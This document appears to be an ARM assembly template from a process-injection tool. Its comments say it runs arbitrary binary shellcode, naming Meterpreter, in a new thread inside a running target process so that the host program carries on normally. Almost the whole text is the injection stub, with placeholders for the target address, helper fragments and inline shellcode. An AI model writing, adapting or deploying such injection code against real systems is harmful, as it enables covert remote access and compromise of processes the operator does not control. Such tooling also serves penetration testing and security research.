# This code will launch the specified binary shellcode (e.g. Meterpreter)
# in a new, separate thread, then return to the original code
# so that the target process continues executing normally after injection
# However, it requires the offset for pthread_create in libpthread to do this
#
# WARNING: the binary shellcode can still cause the entire target process
# to exit. For example, with the default build options, Meterpreter will 
# happily execute in a separate thread, but if you execute the "exit" 
# command from the Meterpreter shell, it will kill the entire target process

b execute_precompiled_threaded_main
// import reusable code fragments
[FRAGMENT:asminject_libpthread_pthread_create.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_exit.s:FRAGMENT]
[FRAGMENT:asminject_nanosleep.s:FRAGMENT]

execute_precompiled_threaded_main:
// load the arbitrary read/write address into r0
	ldr r0, [pc]
	b load_shellcode_address

read_write_address:
	.word [VARIABLE:READ_WRITE_ADDRESS:VARIABLE]
	.balign 4

call_pthread_create:
	bl asminject_libpthread_pthread_create

[VARIABLE:POST_SHELLCODE_LABEL:VARIABLE]:

# inlined shellcode will go after this delimiter
SHELLCODE_SECTION_DELIMITER

load_shellcode_address:
	mov r2, pc
	b call_pthread_create

[VARIABLE:INLINE_SHELLCODE:VARIABLE]

	//mov r0, #0x0	@ pthread_exit return value NULL
	//bl asminject_libpthread_pthread_exit
loop_forever:
	mov r0, #0x10
	mov r1, #0x10
	bl asminject_nanosleep
	b loop_forever

jump_back_from_shellcode:

b [VARIABLE:POST_SHELLCODE_LABEL:VARIABLE]
